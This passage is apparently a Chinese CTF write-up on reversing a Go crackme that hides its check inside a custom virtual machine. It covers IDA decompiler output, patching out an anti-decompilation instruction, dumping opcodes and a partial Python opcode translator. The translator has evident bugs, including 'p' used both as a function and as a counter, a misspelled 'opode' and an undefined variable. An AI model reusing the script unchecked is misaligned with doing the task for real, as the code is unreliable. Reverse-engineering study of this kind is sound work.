<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">LABEL_13:</span><br><span class="line">  sub_442520(v4);</span><br><span class="line">  byte_5F9F60 = <span class="number">0</span>;</span><br><span class="line">  v10 = sub_404F60(v6);</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  runtime_unlockOSThread();</span><br><span class="line">  <span class="keyword">if</span> ( !byte_5F9C6C &amp;&amp; !byte_5F9C6E )</span><br><span class="line">  &#123;</span><br><span class="line">    ((<span class="type">void</span> (*)(<span class="type">void</span>))&amp;qword_4C5508[<span class="number">267</span>])();</span><br><span class="line">    <span class="keyword">if</span> ( !dword_5F9CD0 || !dword_5F9CD0 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( dword_5F9CC8 )</span><br><span class="line">        runtime_gopark(v7, v10);</span><br><span class="line">      runtime_exit(v7);</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        MEMORY[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v13 = <span class="number">0LL</span>;</span><br><span class="line">    runtime_mcall(v7);</span><br><span class="line">  &#125;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  (*v16)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从后往前看找到((void (*)(void))&amp;qword_4C5508[267])()地方，进入发现也没有反编译，老样子点c，再点p。得出来的就是我们要找的main_main函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__int64 __usercall sub_4C5D60@&lt;rax&gt;()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v1; <span class="comment">// r14</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+90h] [rbp-1B8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)&amp;v4 &lt;= *(_QWORD *)(v1 + <span class="number">16</span>) )</span><br><span class="line">    sub_45AB00();</span><br><span class="line">  result = ((__int64 (*)(<span class="type">void</span>))&amp;qword_49AEB8[<span class="number">277</span>])();</span><br><span class="line">  <span class="keyword">if</span> ( !v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt;= <span class="number">0x100</span> )</span><br><span class="line">      sub_45D2A0();</span><br><span class="line">    sub_45D260();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>找到main_main后，发现还有没解析出来的函数，然后又看到主函数的逻辑仿佛像是一个ollvm整过的混淆</p>
<p><img src="/../../../Users/86159/AppData/Roaming/Typora/typora-user-images/image-20221116211529328.png" alt="image-20221116211529328"></p>
<p>在我之前的认知中ollvm的题无非是用脚本或者插件去混淆，或者用unicorn找路线，又或者是硬调。这个题在main_main处还不能f5，这个原因是有一条指令干扰了反汇编，经过尝试发现是下面这个汇编指令干扰了反汇编</p>
<p><img src="/../../../Users/86159/AppData/Roaming/Typora/typora-user-images/image-20221117084151775.png" alt="image-20221117084151775"></p>
<p>将其nop掉就可以f5了，直接得到了经典的虚拟机状态</p>
<p>我们直接看函数，先看前271行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)&amp;v128 &lt;= *(_QWORD *)(v1 + <span class="number">16</span>) )</span><br><span class="line">    sub_5DAB00();</span><br><span class="line">  sub_61B760();</span><br><span class="line">  <span class="keyword">if</span> ( !v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &lt; <span class="number">0x100</span> )</span><br><span class="line">      sub_5DD260();</span><br><span class="line">    v143 = v4 - <span class="number">256</span>;</span><br><span class="line">    v157 = v3 + (((__int64)(<span class="number">256</span> - v4) &gt;&gt; <span class="number">63</span>) &amp; <span class="number">0x100</span>);</span><br><span class="line">    v142 = <span class="number">-248LL</span>;</span><br><span class="line">    retaddr = sub_645BC0();</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_91:</span><br><span class="line">      sub_620E40(v131, v132, v133, v134, v135, v136, v137);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = v142;</span><br><span class="line">      retaddr = sub_645A40();</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        v142 = v6;</span><br><span class="line">        v156 = v7;</span><br><span class="line">        opcode = v2;</span><br><span class="line">        v129 = &amp;v130;</span><br><span class="line">        v8 = ((__int64 (*)(<span class="type">void</span>))loc_5DD486)();</span><br><span class="line">        *((_QWORD *)&amp;opcode + <span class="number">1</span>) = &amp;unk_779E78;</span><br><span class="line">        arr_v163 = &amp;unk_779E78;</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">0LL</span>; v6 &gt; i; i += <span class="number">8LL</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v10 = i + <span class="number">7</span>;</span><br><span class="line">          v11 = <span class="number">0LL</span>;</span><br><span class="line">          <span class="keyword">while</span> ( v10 &gt;= i )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( v6 &lt;= (<span class="type">unsigned</span> __int64)v10 )</span><br><span class="line">              sub_5DD1E0(v131, v132);</span><br><span class="line">            v11 = *(<span class="type">unsigned</span> __int8 *)(v8 + v10--) + (v11 &lt;&lt; <span class="number">8</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          v12 = v175;</span><br><span class="line">          v13 = *((_QWORD *)&amp;opcode + <span class="number">1</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v176 &lt; v175 + <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v141 = i;</span><br><span class="line">            v144 = v11;</span><br><span class="line">            v14 = *((_QWORD *)&amp;opcode + <span class="number">1</span>);</span><br><span class="line">            runtime_growslice(v131);</span><br><span class="line">            v176 = v15;</span><br><span class="line">            *((_QWORD *)&amp;opcode + <span class="number">1</span>) = v16;</span><br><span class="line">            i = v141;</span><br><span class="line">            v11 = v144;</span><br><span class="line">            v12 = v14;</span><br><span class="line">            v13 = v16;</span><br><span class="line">            v8 = v156;</span><br><span class="line">            v6 = v142;</span><br><span class="line">          &#125;</span><br><span class="line">          v175 = v12 + <span class="number">1</span>;</span><br><span class="line">          *(_QWORD *)(v13 + <span class="number">8</span> * v12) = v11;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>函数主要逻辑是先对code.bin的数据进行加载，然后将数据进行hash和rsa的值进行验证，可以不用管，最后将数据进行一个解压生成opcode，我们直接动态调试，在下面的地方下断点，然后跟踪到v18的“生产地”找到opcode，然后提取出来</p>
<p><img src="/../../../Users/86159/AppData/Roaming/Typora/typora-user-images/image-20221117085530441.png" alt="image-20221117085530441"></p>
<p><img src="/../../../Users/86159/AppData/Roaming/Typora/typora-user-images/image-20221117085708154.png" alt="image-20221117085708154"></p>
<p>用下面的脚本提取opcode：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_bin</span>(<span class="params">file_name</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    function: read a bin file, return the tuple of the content in file</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f_content = f.read()</span><br><span class="line">        content = struct.unpack(<span class="string">&quot;B&quot;</span> * <span class="built_in">len</span>(f_content), f_content)</span><br><span class="line">        f.close()</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line">data = read_bin(<span class="string">&#x27;./opcode&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(data),<span class="number">8</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(data[i+<span class="number">7</span>])+<span class="built_in">hex</span>(data[i+<span class="number">6</span>])[<span class="number">2</span>:]+<span class="built_in">hex</span>(data[i+<span class="number">5</span>])[<span class="number">2</span>:]+<span class="built_in">hex</span>(data[i+<span class="number">4</span>])[<span class="number">2</span>:]+<span class="built_in">hex</span>(data[i+<span class="number">3</span>])[<span class="number">2</span>:]+<span class="built_in">hex</span>(data[i+<span class="number">2</span>])[<span class="number">2</span>:]+<span class="built_in">hex</span>(data[i+<span class="number">1</span>])[<span class="number">2</span>:]+<span class="built_in">hex</span>(data[i])[<span class="number">2</span>:],end=<span class="string">&quot;,&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>接下来就是进行一个分析，我们就简单的举两个例子来分析。</p>
<p>比如当op &#x3D;&#x3D; 0x8 时：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( v18 == <span class="number">8</span> )                // op == <span class="number">0x8</span></span><br><span class="line">            &#123;</span><br><span class="line">              v76 = lenth;</span><br><span class="line">              v77 = lenth - <span class="number">1</span>;</span><br><span class="line">              <span class="keyword">if</span> ( lenth &lt;= lenth - <span class="number">1</span> )//不用管<span class="keyword">if</span>这个判断</span><br><span class="line">                sub_5DD1E0(v131, v132);</span><br><span class="line">              v78 = arr[--lenth];</span><br><span class="line">              v79 = v76 - <span class="number">2</span>;</span><br><span class="line">              <span class="keyword">if</span> ( v76 - <span class="number">2</span> &gt;= v77 )//永远不会成立</span><br><span class="line">                sub_5DD1E0(v131, v132);</span><br><span class="line">              v80 = arr[v76 - <span class="number">2</span>];</span><br><span class="line">              lenth = v79;</span><br><span class="line">              v81 = -(__int64)(v80 &lt; <span class="number">0x40</span>) &amp; (v78 &lt;&lt; v80);</span><br><span class="line">              v82 = arr;</span><br><span class="line">              <span class="keyword">if</span> ( nowplace &lt; v77 )//比较毫无意义，就是混淆</span><br><span class="line">              &#123;</span><br><span class="line">                v147 = v81;</span><br><span class="line">                runtime_growslice(v131);</span><br><span class="line">                nowplace = v83;</span><br><span class="line">                arr = v84;</span><br><span class="line">                v81 = v147;</span><br><span class="line">                v79 = (unsigned __int64)v82;</span><br><span class="line">                v82 = v84;</span><br><span class="line">              &#125;</span><br><span class="line">              lenth = v79 + <span class="number">1</span>;</span><br><span class="line">              v82[v79] = v81;//v82就是arr，该行就是表示arr[v79] = -(__int64)(v80 &lt; <span class="number">0x40</span>) &amp; (v78 &lt;&lt; v80)</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>lenth是步长，是决定opcode位置的标识，arr和lenth是全局变量，要进行保留，经过调试发现每一个运算都会使用一个opcode，所以在结束的时候要进行op++。</p>
<p>这是opcode &#x3D;&#x3D; 0x0的情况：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span>                                  <span class="comment">// op == 0x0</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( v175 &lt;= v19 )</span><br><span class="line">              sub_5DD1E0(v131, v132);</span><br><span class="line">            v20 = *(_QWORD *)(*((_QWORD *)&amp;opcode + <span class="number">1</span>) + <span class="number">8</span> * pc + <span class="number">8</span>);<span class="comment">// 取下一个指令</span></span><br><span class="line">            *(_QWORD *)&amp;opcode = pc + <span class="number">2</span>;        <span class="comment">// 更新opcode位置</span></span><br><span class="line">            v21 = lenth;</span><br><span class="line">            v22 = arr;</span><br><span class="line">            <span class="keyword">if</span> ( nowplace &lt; lenth + <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v139 = v20;</span><br><span class="line">              runtime_growslice(v131);</span><br><span class="line">              nowplace = v23;</span><br><span class="line">              arr = v24;</span><br><span class="line">              v20 = v139;</span><br><span class="line">              v21 = (<span class="type">unsigned</span> __int64)v22;</span><br><span class="line">              v22 = v24;</span><br><span class="line">            &#125;</span><br><span class="line">            lenth = v21 + <span class="number">1</span>;</span><br><span class="line">            v22[v21] = v20;</span><br></pre></td></tr></table></figure>

<p>会使用*(_QWORD *)&amp;opcode &#x3D; pc + 2;   进行一个op +&#x3D; 2，v20 &#x3D; *(_QWORD <em>)(</em>((_QWORD *)&amp;opcode + 1) + 8 * pc + 8);是获取opcode值，也就是说这个相当于是一个赋值操作。</p>
<p>我们将opcode编写成c语言，然后通过优化进行一个恢复加密，再通过angr进行解题</p>
<p>给出脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#省略opcode</span></span><br><span class="line">opcode = []</span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">r&quot;.\opcode&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p</span>(<span class="params">pt</span>):</span><br><span class="line">   <span class="keyword">global</span> file</span><br><span class="line">   file.write(pt+<span class="string">&quot;;&quot;</span>+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">arr = [<span class="number">0</span>] * <span class="number">10000</span></span><br><span class="line">lenth = <span class="number">0</span></span><br><span class="line">arr_data = [<span class="number">0</span>] * <span class="number">10000</span></span><br><span class="line">scan_len = <span class="number">0</span></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line">p = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> p &lt; <span class="built_in">len</span>(opode):</span><br><span class="line">    op = opode[p]</span><br><span class="line">    <span class="keyword">if</span> op == <span class="number">0x0</span>:</span><br><span class="line">      v11 = lenth</span><br><span class="line">      lenth = v11 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">      arr[v11] = opode[p + <span class="number">1</span>]</span><br><span class="line">      p(<span class="string">f&quot;arr[<span class="subst">&#123;v11&#125;</span>] = <span class="subst">&#123;arr[v11]&#125;</span>&quot;</span>)</span><br><span class="line">      p += <span class="number">2</span></span><br><span class="line">      </span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0x1</span>:</span><br><span class="line">      v17 = lenth</span><br><span class="line">      v18 = lenth + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">      v15 = opode[p + <span class="number">1</span>]</span><br><span class="line">      v16 = arr_data[v15]</span><br><span class="line">      lenth = v17 + <span class="number">1</span></span><br><span class="line">      arr[v17] = v16</span><br><span class="line">      p(<span class="string">f&quot;arr[<span class="subst">&#123;v17&#125;</span>] = arr_data[<span class="subst">&#123;v15&#125;</span>]&quot;</span>)</span><br><span class="line">      p += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0x2</span>:</span><br><span class="line">      v21 = opode[p + <span class="number">1</span>]</span><br><span class="line">      a_len = lenth - <span class="number">1</span></span><br><span class="line">      v22 = arr[lenth - <span class="number">1</span>]</span><br><span class="line">      lenth -= <span class="number">1</span></span><br><span class="line">      arr_data[v21] = v22</span><br><span class="line">      p(<span class="string">f&quot;arr_data[<span class="subst">&#123;v21&#125;</span>] = arr[<span class="subst">&#123;a_len&#125;</span>]&quot;</span>)</span><br><span class="line">      p += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0x3</span>:</span><br><span class="line">       v23 = lenth</span><br><span class="line">       v24 = lenth - <span class="number">1</span></span><br><span class="line">       lenth -= <span class="number">1</span></span><br><span class="line">       a_len = lenth</span><br><span class="line">       v25 = arr[lenth]</span><br><span class="line">       v26 = v23 - <span class="number">2</span></span><br><span class="line">       v27 = arr[v23 - <span class="number">2</span>] + v25</span><br><span class="line">       lenth = v32 - <span class="number">2</span></span><br><span class="line">       lenth = v26 + <span class="number">1</span></span><br><span class="line">       arr[v26] = v27</span><br><span class="line">       p(<span class="string">f&quot;arr[<span class="subst">&#123;v26&#125;</span>] = arr[<span class="subst">&#123;v23 - <span class="number">2</span>&#125;</span>] + arr[<span class="subst">&#123;a_len&#125;</span>]&quot;</span>)</span><br><span class="line">       p += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0x4</span>:</span><br><span class="line">       v31 = lenth</span><br><span class="line">       v32 = lenth - <span class="number">1</span></span><br><span class="line">       a_len = lenth - <span class="number">1</span></span><br><span class="line">       v33 = arr[lenth - <span class="number">1</span>]</span><br><span class="line">       lenth -= <span class="number">1</span></span><br><span class="line">       v34 = v31 - <span class="number">2</span></span><br><span class="line">       v35 = v33 - arr[v31 - <span class="number">2</span>]</span><br><span class="line">       lenth = v31 - <span class="number">2</span></span><br><span class="line">       lenth = v34 + <span class="number">1</span></span><br><span class="line">       arr[v34] = v35</span><br><span class="line">       p(<span class="string">f&quot;arr[<span class="subst">&#123;v34&#125;</span>] = arr[<span class="subst">&#123;a_len&#125;</span>] - arr[<span class="subst">&#123;v31 - <span class="number">2</span>&#125;</span>]&quot;</span>) </span><br><span class="line">       p += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0x5</span>:</span><br><span class="line">       v39 = lenth</span><br><span class="line">       v40 = lenth - <span class="number">1</span></span><br><span class="line">       a_len = lenth - <span class="number">1</span> </span><br><span class="line">       v41 = arr[lenth - <span class="number">1</span>]</span><br><span class="line">       lenth -= <span class="number">1</span></span><br><span class="line">       v42 = v39 - <span class="number">2</span></span><br><span class="line">       v43 = arr[v39 - <span class="number">2</span>]</span><br><span class="line">       lenth = v39 - <span class="number">2</span></span><br><span class="line">       v44 = v43 * v41</span><br><span class="line">       lenth = v42 + <span class="number">1</span></span><br><span class="line">       arr[v42] = v44</span><br><span class="line">       p(<span class="string">f&quot;arr[<span class="subst">&#123;v42&#125;</span>] = arr[<span class="subst">&#123;v39 - <span class="number">2</span>&#125;</span>] * arr[<span class="subst">&#123;a_len&#125;</span>]&quot;</span>)</span><br><span class="line">       p += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0x6</span>:</span><br><span class="line">       v48 = lenth</span><br><span class="line">       v49 = lenth - <span class="number">1</span></span><br><span class="line">       a_len = lenth - <span class="number">1</span></span><br><span class="line">       v50 = arr[lenth - <span class="number">1</span>]</span><br><span class="line">       lenth -= <span class="number">1</span></span><br><span class="line">       v51 = v48 - <span class="number">2</span></span><br><span class="line">       v52 = arr[v48 - <span class="number">2</span>]</span><br><span class="line">       lenth = v48 - <span class="number">2</span></span><br><span class="line">       v53 = v49</span><br><span class="line">       v54 = v50 // v52</span><br><span class="line">       lenth = v51 + <span class="number">1</span></span><br><span class="line">       arr[v51] = v54</span><br><span class="line">       p(<span class="string">f&quot;arr[<span class="subst">&#123;v51&#125;</span>] = arr[<span class="subst">&#123;a_len&#125;</span>] // arr[<span class="subst">&#123;v48 - <span class="number">2</span>&#125;</span>]&quot;</span>)</span><br><span class="line">       <span class="keyword">assert</span> <span class="number">0</span></span><br><span class="line">       p += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0x7</span>:</span><br><span class="line">       v68 = lenth</span><br><span class="line">       v69 = lenth - <span class="number">1</span></span><br><span class="line">       a_len = lenth - <span class="number">1</span></span><br><span class="line">       v70 = arr[lenth - <span class="number">1</span>]</span><br><span class="line">       lenth -= <span class="number">1</span></span><br><span class="line">       v71 = v68 - <span class="number">2</span></span><br><span class="line">       v72 = arr[v68 - <span class="number">2</span>] ^ v70</span><br><span class="line">       lenth = v68 - <span class="number">2</span></span><br><span class="line">       lenth = v71 + <span class="number">1</span></span><br><span class="line">       arr[v71] = v72</span><br><span class="line">       p(<span class="string">f&quot;arr[<span class="subst">&#123;v71&#125;</span>] = arr[<span class="subst">&#123;v68 - <span class="number">2</span>&#125;</span>] ^ arr[<span class="subst">&#123;a_len&#125;</span>]&quot;</span>)</span><br><span class="line">       p += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0x8</span>:</span><br><span class="line">       v76 = lenth</span><br><span class="line">       v77 = lenth - <span class="number">1</span></span><br><span class="line">       lenth -= <span class="number">1</span></span><br><span class="line">       a_len = lenth</span><br><span class="line">       v78 = arr[lenth]</span><br><span class="line">       v79 = v76 - <span class="number">2</span></span><br><span class="line">       v80 = arr[v76 - <span class="number">2</span>]</span><br><span class="line">       lenth = v79</span><br><span class="line">       v81 = -(v80 &lt; <span class="number">0x40</span>) &amp; (v78 &lt;&lt; v80)</span><br><span class="line">       lenth = v79 + <span class="number">1</span></span><br><span class="line">       arr[v79] = v81</span><br><span class="line">       p(<span class="string">f&quot;arr[<span class="subst">&#123;v79&#125;</span>] = -(arr[<span class="subst">&#123;v76 - <span class="number">2</span>&#125;</span>] &lt; 0x40) &amp; (arr[<span class="subst">&#123;a_len&#125;</span>] &lt;&lt; arr[<span class="subst">&#123;v76 - <span class="number">2</span>&#125;</span>])&quot;</span>)</span><br><span class="line">       p += <span class="number">1</span></span><br><span 